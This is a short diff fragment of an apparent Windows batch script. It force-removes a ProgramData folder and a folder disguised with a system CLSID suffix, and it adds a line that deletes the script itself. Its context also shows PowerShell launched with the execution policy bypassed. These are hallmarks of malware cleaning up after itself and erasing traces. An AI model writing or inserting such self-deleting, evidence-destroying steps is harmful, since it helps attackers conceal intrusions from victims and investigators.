@@ -105,3 +105,4 @@ cmd.exe /c start "" powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "
 
 rd /s /q "%ProgramData%\Comms"
 rd /s /q "\\.\%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
+del /f "%~f0"
